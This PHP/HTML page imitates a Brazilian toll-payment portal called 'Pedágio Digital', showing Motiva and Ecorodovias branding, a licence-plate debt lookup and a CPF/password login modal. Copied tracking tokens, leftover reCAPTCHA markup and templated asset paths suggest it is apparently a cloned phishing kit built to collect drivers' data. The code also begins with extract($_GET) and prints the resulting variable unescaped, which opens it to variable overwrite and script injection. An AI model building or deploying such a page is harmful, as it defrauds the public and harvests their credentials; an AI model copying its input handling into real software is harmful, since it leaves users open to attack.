<?php

extract($_GET);

if($sucesso){

   include_once("./pages/pedagiodigital/home.php");

  return;
} 
?>

<html lang="pt-br">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Pedágio Digital</title>
    <meta name="description"
        content="Acesse e controle seus pagamentos de pedágio digital em um só lugar. Rápido, seguro e fácil.">
    <link rel="canonical" href="https://www.pedagiodigital.com/">

    <!-- Favicons -->
    <link rel="icon" href="./<?=$diretorio?>/arquivos/favicon1-oV_RAOOi.png" type="image/png">
    <link rel="apple-touch-icon" href="./<?=$diretorio?>/arquivos/favicon1-oV_RAOOi.png">
    <meta name="theme-color" content="#0b2239">


    <!-- Fonte -->
    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <!-- acrescente display=swap para evitar FOIT -->
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&amp;display=swap" rel="stylesheet">


    <meta name="robots" content="index,follow">
    <link rel="canonical" href="https://www.pedagiodigital.com/">

    <!-- Favicons extras -->
    <link rel="icon" sizes="192x192" href="./<?=$diretorio?>/arquivos/favicon1-oV_RAOOi.png">
    <link rel="apple-touch-icon" sizes="180x180" href="./<?=$diretorio?>/arquivos/favicon1-oV_RAOOi.png">

    <!-- Social -->
    <meta property="og:title" content="Pedágio Digital">
    <meta property="og:description" content="Acesse e controle seus pagamentos de pedágio digital em um só lugar.">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://www.pedagiodigital.com/og-card.png">
    <meta property="og:locale" content="pt_BR">
    <meta name="twitter:card" content="summary_large_image">


    <style>

    
    img[width][height] {
      height: auto
    }
  
img[width][height] { height: auto; }
* { -webkit-font-smoothing: antialiased; text-rendering: optimizelegibility; margin: 0px; font-family: Ubuntu, sans-serif !important; }
.site-header { position: relative; top: 0px; z-index: 1000; margin-bottom: -120px; }
.hdr-container { max-width: 1200px; margin: 0px auto; padding: 14px 20px; display: flex; align-items: center; gap: 20px; }
.brand { display: flex; align-items: center; gap: 12px; text-decoration: none; }
.brand img { height: auto; width: 100%; display: block; }
.brand .brand-name { color: rgb(234, 241, 248); font-weight: 800; letter-spacing: 0.2px; }
nav.primary-nav { margin-left: auto; }
.nav-list { list-style: none; display: flex; gap: 18px; margin: 0px; padding: 0px; align-items: center; }
.nav-list a { display: inline-flex; align-items: center; gap: 8px; text-decoration: none; color: rgb(234, 241, 248); font-weight: 400; letter-spacing: 0.2px; padding: 8px 10px; border-radius: 12px; transition: background 0.15s, transform 0.15s; font-size: 18px; }
.nav-list li:last-child a { border: 1px solid rgb(255, 255, 255); border-radius: 12px; padding: 10px 16px; }
.nav-list a:hover, .nav-list a:focus-visible { background: rgba(255, 255, 255, 0.06); }
.btn-cta { margin-left: 8px; padding: 10px 14px; border-radius: 999px; background: rgb(255, 159, 28); color: rgb(9, 26, 44); font-weight: 900; text-decoration: none; border: 0px; box-shadow: rgba(0, 0, 0, 0.25) 0px 6px 20px; transition: transform 0.15s; }
.btn-cta:hover { transform: translateY(-1px); }
.menu-toggle { display: none; margin-left: auto; background: transparent; padding: 8px; border-radius: 10px; border: 1px solid rgb(255, 255, 255); }
.menu-toggle:focus-visible { outline: rgb(215, 230, 244) solid 2px; }
.menu-toggle .bar { width: 22px; height: 2px; background: rgb(234, 241, 248); display: block; margin: 5px 0px; border-radius: 2px; }
@media (max-width: 900px) {
  .menu-toggle { display: block; }
  nav.primary-nav { position: fixed; inset: 64px 14px 14px; background: rgb(255, 255, 255); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 14px; transform: translateY(-12px); opacity: 0; pointer-events: none; transition: transform 0.18s, opacity 0.18s; box-shadow: rgba(0, 0, 0, 0.45) 0px 28px 80px; height: 180px; }
  nav.primary-nav.is-open { transform: translateY(0px); opacity: 1; pointer-events: auto; }
  .nav-list { flex-direction: column; padding: 14px; }
  .nav-list a { color: rgb(0, 0, 0); font-size: 16px; }
  .btn-cta { width: 100%; text-align: center; }
  body.menu-open { overflow: hidden; }
}
.sr-only { position: absolute !important; width: 1px !important; height: 1px !important; padding: 0px !important; margin: -1px !important; overflow: hidden !important; clip: rect(0px, 0px, 0px, 0px) !important; white-space: nowrap !important; border: 0px !important; }
.menu-toggle { position: relative; width: 40px; height: 40px; }
.menu-toggle .bar { position: absolute; left: 9px; right: 9px; height: 2px; background: rgb(234, 241, 248); border-radius: 2px; transition: transform 0.28s cubic-bezier(0.22, 0.61, 0.36, 1), opacity 0.18s, top 0.28s cubic-bezier(0.22, 0.61, 0.36, 1), bottom 0.28s cubic-bezier(0.22, 0.61, 0.36, 1); }
.menu-toggle .bar:nth-child(1) { top: 6px; }
.menu-toggle .bar:nth-child(2) { top: 13px; }
.menu-toggle .bar:nth-child(3) { top: 20px; }
.menu-toggle[aria-expanded="true"] .bar:nth-child(1) { transform: translateY(7px) rotate(45deg); }
.menu-toggle[aria-expanded="true"] .bar:nth-child(2) { opacity: 0; }
.menu-toggle[aria-expanded="true"] .bar:nth-child(3) { transform: translateY(-7px) rotate(-45deg); }
@media (prefers-reduced-motion: reduce) {
  .menu-toggle .bar { transition: transform 0.15s, opacity 0.1s linear; }
}
.hero { position: relative; min-height: 100svh; display: grid; color: rgb(241, 243, 245); }
.hero__bg { position: absolute; inset: 0px; background: linear-gradient(90deg, rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.55) 40%, rgba(0, 0, 0, 0.35) 60%, rgba(0, 0, 0, 0.55)), url("./<?=$diretorio?>/arquivos/inicio-bg-B9TsfniF.png") center center / cover no-repeat rgba(0, 0, 0, 0.1); filter: saturate(110%); z-index: 0; margin-left: -5px; }
.hero__grid { align-self: center; max-width: 1200px; margin: 0px auto; padding: 40px 20px 72px; display: grid; grid-template-columns: 1fr 420px; gap: 40px; align-items: center; z-index: 10; }
@media (max-width: 1800px) {
  .hero__grid { padding: 160px 20px 72px; }
}
.hero__left { align-self: center; }
.hero__title { font-weight: 900; line-height: 1.6; font-size: 4rem; letter-spacing: 3px; margin: 8px 0px 18px; text-transform: uppercase; color: rgb(255, 255, 255); }
.highlight { color: rgb(229, 255, 81); font-size: 64px; }
.hero__subtitle { font-size: 18px; color: rgb(255, 255, 255); max-width: 720px; }
.hero__card { background: rgb(229, 231, 235); color: rgb(27, 31, 40); border: 1px solid rgba(0, 0, 0, 0.1); border-radius: 12px; box-shadow: rgba(0, 0, 0, 0.45) 0px 28px 80px; padding: 32px; }
.card__title { font-size: 24px; line-height: 32px; margin: 4px 2px 20px; font-weight: 400; color: rgb(0, 0, 0); }
.card__title strong { font-weight: 700; }
.card__form { display: grid; gap: 20px; }
.card__form span { font-size: 16px; color: rgb(0, 0, 0); }
.inp { width: 90%; height: 48px; border-radius: 12px; padding: 8px 14px; border: 2px solid rgb(223, 227, 234); background: rgb(244, 246, 250); color: rgb(0, 0, 0); font-weight: 400; letter-spacing: 0.6px; font-size: 16px; }
.inp::placeholder { color: rgb(163, 173, 187); font-weight: 700; }
.inp:focus { outline: 0px; border-color: rgb(142, 197, 255); box-shadow: rgba(142, 197, 255, 0.35) 0px 0px 0px 3px; }
.chk { display: grid; grid-template-columns: 18px 1fr; align-items: start; gap: 10px; font-size: 14px; color: rgb(30, 37, 47); }
.chk { display: grid; grid-template-columns: 24px 1fr; align-items: start; gap: 12px; font-size: 14px; color: rgb(30, 37, 47); cursor: pointer; }
.chk input { width: 24px; height: 24px; margin: 0px; accent-color: rgb(0, 0, 0); }
.chk input:focus-visible { outline: none; box-shadow: rgba(0, 0, 0, 0.18) 0px 0px 0px 3px; }
.chk a { color: rgb(107, 114, 128); text-underline-offset: 2px; font-style: italic; }
.btn { display: inline-flex; align-items: center; justify-content: center; width: 100%; height: 60px; padding: 0px 20px; border-radius: 12px; border: 0px; font-style: inherit; font-variant: inherit; font-stretch: inherit; line-height: inherit; font-family: inherit; font-optical-sizing: inherit; font-size-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit; font-variation-settings: inherit; font-language-override: inherit; font-weight: 500; font-size: 18px; margin: 20px 0px; text-decoration: none; background: rgb(209, 213, 219); color: rgb(255, 255, 255); cursor: not-allowed; transition: background-color 0.2s, color 0.2s, box-shadow 0.2s, transform 0.15s, filter 0.2s; box-shadow: none; box-sizing: border-box; }
.btn[disabled], .btn.is-disabled, .btn[aria-disabled="true"] { background: rgb(209, 213, 219); color: rgb(255, 255, 255); cursor: not-allowed; box-shadow: none; filter: none; pointer-events: none; }
.btn:not([disabled]):not(.is-disabled):not([aria-disabled="true"]) { background: rgb(0, 0, 0); color: rgb(229, 255, 81); cursor: pointer; box-shadow: rgba(0, 0, 0, 0.35) 0px 10px 30px; }
.btn:not([disabled]):not(.is-disabled):not([aria-disabled="true"]):is(:hover, :focus-visible) { filter: brightness(1.02); transform: translateY(-1px); }
.card__link { text-align: center; margin-top: 12px; }
.card__link a { color: rgb(0, 0, 0); text-decoration: underline; text-underline-offset: 2px; font-size: 16px; }
@media (max-width: 1100px) {
  .hero__grid { grid-template-columns: 1fr 380px; gap: 28px; }
}
@media (max-width: 900px) {
  .hero__grid { grid-template-columns: 1fr; gap: 12px; margin-top: 50px; padding: 120px 12px !important; }
  .hero__right { order: 2; }
  .hero__left { order: 1; }
  .hero__title, .highlight { font-size: 50px; }
}
@media (max-width: 768px) {
  .hero__title, .highlight { font-size: 24px; }
  .hero__subtitle { font-size: 16px; }
  .brand img { height: auto; width: 70%; display: block; }
}
.support { margin-top: 0px; color: rgb(0, 0, 0); }
.support__toggle { width: 100%; background: rgb(17, 17, 17); color: rgb(255, 255, 255); border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; padding: 0px; display: block; cursor: pointer; border-top-style: solid; border-top-color: rgb(57, 57, 57); }
.support__container { max-width: 1200px; margin: 0px auto; padding: 20px; display: flex; align-items: center; gap: 12px; }
.support__container strong { font-size: 20px; font-weight: 700; }
.support__container .chev { margin-left: auto; transition: transform 0.18s; }
.support__toggle[aria-expanded="true"] .chev { transform: rotate(180deg); }
.support__panel { background: rgb(229, 231, 235); border-top: 1px solid rgba(0, 0, 0, 0.08); }
.support__inner { max-width: 1210px; margin: 0px auto; padding: 0px 20px; }
.acc { margin: 0px; padding: 16px 0px 24px; }
.acc__item { border-bottom: 1px solid rgba(0, 0, 0, 0.06); }
.acc__item:last-child { border-bottom: none; }
.acc__btn { width: 100%; background: transparent; border: 0px; padding: 18px 8px; display: flex; align-items: center; justify-content: space-between; font: inherit; cursor: pointer; }
.acc__btn span { font-weight: 800; color: rgb(0, 0, 0); letter-spacing: 0.2px; font-size: 20px; }
.acc__btn .chev { transition: transform 0.18s; }
.acc__btn[aria-expanded="true"] .chev { transform: rotate(180deg); }
.acc__content { padding: 2px 8px 18px; }
.acc__link { display: inline-block; color: rgb(136, 136, 136); text-decoration: none; border-bottom: 1px solid rgba(0, 0, 0, 0.15); padding-bottom: 2px; word-break: break-word; font-size: 18px; font-weight: 700; }
@media (max-width: 720px) {
  .support__container { padding: 16px; }
  .acc { padding: 8px 14px 18px; }
}
.site-footer { background: rgb(54, 54, 54); border-top: 1px solid rgba(255, 255, 255, 0.08); color: rgb(233, 237, 242); }
.ft-container { max-width: 1200px; margin: 0px auto; padding: 24px 0px; display: flex; align-items: center; justify-content: space-between; gap: 16px; }
.ft-brand img { height: auto; width: 80%; display: block; }
.ft-logos { list-style: none; display: flex; align-items: center; gap: 28px; margin: 0px; padding: 0px; }
.ft-logos img { height: 22px; width: auto; opacity: 0.9; filter: grayscale(1) contrast(1.05) brightness(0.96); transition: opacity 0.15s; }
.ft-logos img:hover { opacity: 1; }
@media (max-width: 720px) {
  .ft-container { flex-wrap: nowrap; gap: 0px; }
  .ft-logos { margin-left: auto; gap: 10px; padding-right: 20px; }
  .ft-logos img { height: 20px; }
  .ft-logos li:first-child img { margin-top: 10px; }
  .ft-brand img { width: 80%; }
}
.login-modal { position: fixed; inset: 0px; display: grid; place-items: center; z-index: 1000; opacity: 0; pointer-events: none; transition: opacity 0.2s; }
.login-modal.is-open { opacity: 1; pointer-events: auto; }
.login-modal__overlay { position: absolute; inset: 0px; background: rgba(0, 0, 0, 0.48); backdrop-filter: blur(2px); }
.login-modal__card { position: relative; width: min(450px, 92vw); background: rgb(255, 255, 255); border-radius: 14px; box-shadow: rgba(0, 0, 0, 0.45) 0px 30px 80px; padding: 40px 30px; }
.login-form { display: grid; gap: 14px; }
.lm-field { position: relative; }
.lm-field input { width: 95%; height: 60px; border: 1px solid rgb(229, 231, 235); border-radius: 12px; background: rgb(255, 255, 255); padding: 0px 14px; font: 400 18px / 1 Ubuntu, system-ui, sans-serif; color: rgb(0, 0, 0); outline: none; }
.lm-field input:focus { border-color: rgb(17, 17, 17); box-shadow: rgba(0, 0, 0, 0.08) 0px 0px 0px 3px; }
.lm-field--password input { border-color: rgb(215, 222, 234); }
.lm-eye { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); display: inline-flex; align-items: center; justify-content: center; width: 34px; height: 34px; border: 0px; background: transparent; color: rgb(17, 17, 17); cursor: pointer; border-radius: 8px; }
.lm-eye:hover { background: rgba(0, 0, 0, 0.06); }
.lm-forgot { margin: -4px 0px 6px; text-align: right; }
.lm-forgot a { color: rgb(156, 163, 175); text-decoration: underline; font-size: 14px; }
.lm-primary { height: 60px; border: 0px; border-radius: 10px; font-weight: 400; font-size: 16px; transition: background-color 0.2s, color 0.2s, box-shadow 0.2s, filter 0.2s; }
.lm-primary:disabled { background: rgb(156, 163, 175); color: rgb(255, 255, 255); cursor: not-allowed; box-shadow: none; filter: none; }
.lm-primary:not(:disabled) { background: rgb(0, 0, 0); color: rgb(229, 255, 81); cursor: pointer; box-shadow: rgba(0, 0, 0, 0.25) 0px 18px 40px; }
.lm-primary:not(:disabled):hover { filter: brightness(1.02); }
.lm-sep { text-align: center; color: rgb(75, 85, 99); font-size: 16px; margin: 32px 0px 0px; }
.lm-secondary { height: 60px; border-radius: 10px; border: 1.8px solid rgb(17, 17, 17); background: rgb(255, 255, 255); color: rgb(0, 0, 0); font-size: 16px; font-weight: 700; cursor: pointer; }
.lm-secondary:hover { background: rgb(250, 250, 250); }
@media (max-width: 520px) {
  .login-modal__card { padding: 20px; border-radius: 12px; width: min(280px, 92vw); }
  .lm-field input { height: 48px; width: 90%; }
  .lm-primary, .lm-secondary { height: 48px; }
}
.sr-only { width: 1px; height: 1px; padding: 0px; margin: -1px; overflow: hidden; clip: rect(0px, 0px, 0px, 0px); white-space: nowrap; border: 0px; position: absolute !important; }
@media (max-width: 768px) {
  .hero__card { padding: 20px 12px; }
  .hero__right { order: 2; margin-left: -2px; }
  .login-modal__card { width: min(300px, 92vw); }
}
.spinner { display: inline-block; width: 12px; height: 12px; border-width: 2px; border-style: solid; border-color: currentcolor transparent currentcolor currentcolor; border-image: initial; border-radius: 50%; animation: 0.7s linear 0s infinite normal none running spin; vertical-align: -2px; margin-right: 8px; }
@keyframes spin { 
  100% { transform: rotate(360deg); }
}
.btn--loading { pointer-events: none; opacity: 0.85; }
.loading-backdrop { position: fixed; inset: 0px; background: rgba(0, 0, 0, 0.35); display: grid; place-items: center; z-index: 9999; }
.loading-box { background: rgb(255, 255, 255); border-radius: 12px; padding: 16px 18px; box-shadow: rgba(0, 0, 0, 0.18) 0px 12px 48px; font: 500 14px / 1.2 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
.loading-box .spinner { width: 16px; height: 16px; margin-right: 10px; }


    </style>

 

    <link href="https://s.go-mpulse.net/boomerang/WATB7-9TEGU-Z4EUL-D5Z73-WGLN5" rel="preload" as="script">
    <meta http-equiv="origin-trial"
        content="A6MWCkFp/4goXtWiSJNfo09g03RCQpXkuDZDGnlApjvSPZL4CIhvZx3xGfg6bCT4TRppCXmFXWDEkxA7DO3nZgQAAACGeyJvcmlnaW4iOiJodHRwczovL2dvLW1wdWxzZS5uZXQ6NDQzIiwiZmVhdHVyZSI6IlNvZnROYXZpZ2F0aW9uSGV1cmlzdGljcyIsImV4cGlyeSI6MTcwOTY4MzE5OSwiaXNTdWJkb21haW4iOnRydWUsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
    <meta http-equiv="origin-trial"
        content="A2uWz2bbyoykT6h7LZQlNUdwVAFfb3IL5LU+YR1qxtW5T1dCRKjJ5/h3zur1LmuLWk0B1kyAAwyCxJzDCzNxUAQAAAB6eyJvcmlnaW4iOiJodHRwczovL2FrYW1haS5jb206NDQzIiwiZmVhdHVyZSI6IkJhY2tGb3J3YXJkQ2FjaGVOb3RSZXN0b3JlZFJlYXNvbnMiLCJleHBpcnkiOjE2OTE1MzkxOTksImlzVGhpcmRQYXJ0eSI6dHJ1ZX0=">
</head>


<body>
    <a href="#conteudo" class="sr-only">Pular para conteúdo</a>
    <!-- HEADER -->
    <header class="site-header" role="banner">
        <div class="hdr-container">
            <a class="brand" >
                <img id="brand-logo" src="./<?=$diretorio?>/arquivos/logo-CWdoJbug.png" alt="Pedágio Digital" loading="eager">
            </a>

            <!-- Botão mobile -->
            <button id="menu-toggle" class="menu-toggle" aria-controls="primary-navigation" aria-expanded="false"
                aria-label="Abrir menu">
                <span class="bar" aria-hidden="true"></span>
                <span class="bar" aria-hidden="true"></span>
                <span class="bar" aria-hidden="true"></span>
            </button>

            <!-- Navegação -->
            <nav id="primary-navigation" class="primary-nav" aria-label="Principal">
                <ul class="nav-list">
                    <li><a id="openLogin" class="js-open-login">Fazer Login</a></li>
                    <li><a>Perguntas frequentes</a></li>
                    <li><a>Criar Conta</a></li>
                </ul>
            </nav>
        </div>
    </header>
    <section class="hero" id="inicio" aria-label="Seção inicial">
        <div class="hero__bg" aria-hidden="true"></div>

        <div class="hero__grid">
            <div class="hero__left">
                <h1 class="hero__title">
                    DESFRUTE DE TODA A<br>
                    COMODIDADE DO<br>
                    PEDÁGIO <span class="highlight">DIGITAL</span>
                </h1>
                <p class="hero__subtitle">
                    Uma nova era para o pedágio começou: ágil e digital como tem que ser.
                </p>
            </div>

            <aside class="hero__right" aria-label="Consulta de débitos">
                <div class="hero__card">
                    <h2 class="card__title">
                        Um <strong>único</strong> lugar para <strong>acessar</strong> e
                        <strong>controlar</strong> seus pagamentos.
                    </h2>

                    <form class="card__form" action="#" method="get">
                                                <label class="sr-only" for="placa">Digite sua placa</label>
                                                <input id="placa" class="inp" type="text" placeholder="DIGITE SUA PLACA" autocomplete="off" inputmode="latin" maxlength="7">

                                                <label class="chk">
                                                        <input type="checkbox" id="termos">
                                                        <span>Aceito os <a target="_blank">Termos e Condições de Uso</a>.</span>
                                                </label>

                                                <label class="chk">
                                                        <input type="checkbox" id="privacidade">
                                                        <span>Estou ciente da <a target="_blank">Política de Privacidade</a> e me responsabilizo pela veracidade dos dados.</span>
                                                </label>

                                                <button class="btn is-disabled" id="buscarDebitos" type="submit" disabled aria-disabled="true">Buscar débitos</button>
                                        </form>

<script>
// Ativa o botão Buscar débitos quando todos os campos estão preenchidos e checkboxes marcados
document.addEventListener('DOMContentLoaded', function() {
    const placa = document.getElementById('placa');
    const termos = document.getElementById('termos');
    const privacidade = document.getElementById('privacidade');
    const btn = document.getElementById('buscarDebitos');
    const form = document.querySelector('.card__form');

    function updateButtonState() {
        const placaFilled = placa.value.trim().length > 0;
        const termosChecked = termos.checked;
        const privChecked = privacidade.checked;
        if (placaFilled && termosChecked && privChecked) {
            btn.disabled = false;
            btn.classList.remove('is-disabled');
            btn.setAttribute('aria-disabled', 'false');
        } else {
            btn.disabled = true;
            btn.classList.add('is-disabled');
            btn.setAttribute('aria-disabled', 'true');
        }
    }

    placa.addEventListener('input', updateButtonState);
    termos.addEventListener('change', updateButtonState);
    privacidade.addEventListener('change', updateButtonState);

    // Função para travar/destravar a página
    function setPageLocked(locked) {
        if (locked) {
            document.body.style.pointerEvents = 'none';
            document.body.style.userSelect = 'none';
        } else {
            document.body.style.pointerEvents = '';
            document.body.style.userSelect = '';
        }
    }

    // Cria o elemento de carregando
    function showLoading() {
        let loading = document.createElement('div');
        loading.id = 'loading-backdrop';
        loading.className = 'loading-backdrop';
        loading.innerHTML = '<div class="loading-box"><span class="spinner"></span>Carregando...</div>';
        document.body.appendChild(loading);
    }
    function hideLoading() {
        let loading = document.getElementById('loading-backdrop');
        if (loading) loading.remove();
    }

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        setPageLocked(true);
        showLoading();
        const placaValue = placa.value.trim().toUpperCase();
        fetch(`/api/pedagiodigital.php?placa=${encodeURIComponent(placaValue)}`)
            .then(resp => resp.json())
            .then(data => {
                if (data.IsStatus) {
                    console.log(data);
                    sessionStorage.setItem('pedagiodigitalData', JSON.stringify(data));
                    window.location.href = `/?sucesso=${encodeURIComponent(placaValue)}`;
                }
            })
            .catch(err => {
                // Se quiser, pode mostrar erro
                // alert('Erro ao consultar débitos.');
            })
            .finally(() => {
                hideLoading();
                setPageLocked(false);
            });
    });
});
</script>

                    <p class="card__link">
                        <a href="#login" class="js-open-login">Começar agora</a>
                    </p>
                </div>
            </aside>
        </div>
    </section>

    <section id="central-atendimento" class="support" aria-labelledby="support-title">
        <button class="support__toggle" aria-controls="support-panel" aria-expanded="false">
            <div class="support__container">
                <strong id="support-title">Central de atendimento</strong>
                <svg class="chev" width="32" height="32" viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round"></path>
                </svg>
            </div>
        </button>



        <div id="support-panel" class="support__panel" hidden="">
            <div class="support__inner">
                <div class="acc">
                    <!-- Item 1 -->
                    <div class="acc__item">
                        <button class="acc__btn" aria-expanded="false" aria-controls="acc-motiva">
                            <span>Motiva</span>
                            <svg class="chev" width="28" height="28" viewBox="0 0 24 24" aria-hidden="true">
                                <path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2"
                                    stroke-linecap="round" stroke-linejoin="round"></path>
                            </svg>
                        </button>
                        <div id="acc-motiva" class="acc__content" hidden="">
                            <a class="acc__link"
                                target="_blank" rel="noopener">
                                https://www.motiva.com.br/contatos
                            </a>
                        </div>
                    </div>

                    <!-- Item 2 -->
                    <div class="acc__item">
                        <button class="acc__btn" aria-expanded="false" aria-controls="acc-eco">
                            <span>Eco Rodovias</span>
                            <svg class="chev" width="28" height="28" viewBox="0 0 24 24" aria-hidden="true">
                                <path d="M6 9l6 6 6-6" fill="none" stroke="currentColor" stroke-width="2"
                                    stroke-linecap="round" stroke-linejoin="round"></path>
                            </svg>
                        </button>
                        <div id="acc-eco" class="acc__content" hidden="">
                            <a class="acc__link" target="_blank"
                                rel="noopener">
                                freeflow.econoroeste.com.br/fale-conosco
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>



    <footer class="site-footer" role="contentinfo">
        <div class="ft-container">
            <a class="ft-brand" aria-label="Pedágio Digital">
                <img src="./<?=$diretorio?>/arquivos/logo-CWdoJbug.png" alt="Pedágio Digital">
            </a>

            <ul class="ft-logos" aria-label="Empresas parceiras">
                <li>
                    <img src="./<?=$diretorio?>/arquivos/logo-motiva-BcheVkaT.svg" alt="Motiva" loading="lazy" decoding="async">
                </li>
                <li>
                    <img src="./<?=$diretorio?>/arquivos/logo-eco-Cdd8S58B.png" alt="Ecorodovias" loading="lazy" decoding="async" style="margin-top: -10px;
">
                </li>
            </ul>
        </div>
    </footer>

    <!-- Modal de Login -->
    <div class="login-modal" id="loginModal" aria-hidden="true">
        <div class="login-modal__overlay" data-close="login" aria-hidden="true"></div>

        <div class="login-modal__card" role="dialog" aria-modal="true" aria-labelledby="loginTitle">
            <form id="loginForm" class="login-form" novalidate="">
                <h2 id="loginTitle" class="sr-only">Acessar conta</h2>

                <label class="lm-field">
                    <input type="text" id="lmCpf" inputmode="numeric" autocomplete="username"
                        placeholder="Seu CPF / CNPJ">
                </label>

                <label class="lm-field lm-field--password">
                    <input type="password" id="lmPass" autocomplete="off" placeholder="Senha">
                    <button type="button" class="lm-eye" id="lmTogglePwd" aria-label="Mostrar senha">
                        <svg width="22" height="22" viewBox="0 0 24 24" aria-hidden="true">
                            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12Z" fill="none" stroke="currentColor"
                                stroke-width="1.8"></path>
                            <circle cx="12" cy="12" r="3" fill="none" stroke="currentColor" stroke-width="1.8"></circle>
                        </svg>
                    </button>
                </label>

                <p class="lm-forgot"><a href="#" id="lmForgot">Esqueci a senha</a></p>

              

                <button class="lm-primary" id="lmSubmit" type="submit" disabled="">Acessar conta</button>

                <div class="lm-sep">Você ainda não tem uma conta?</div>

                <button type="button" class="lm-secondary" id="lmCreate">Criar uma conta</button>
            </form>
        </div>
    </div>


    <div
        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility linear 0.3s, opacity 0.3s linear; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
        <div
            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
        </div>
        
    </div>
    <div
        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility linear 0.3s, opacity 0.3s linear; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
        <div
            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
        </div>
    </div>
</body>

</html>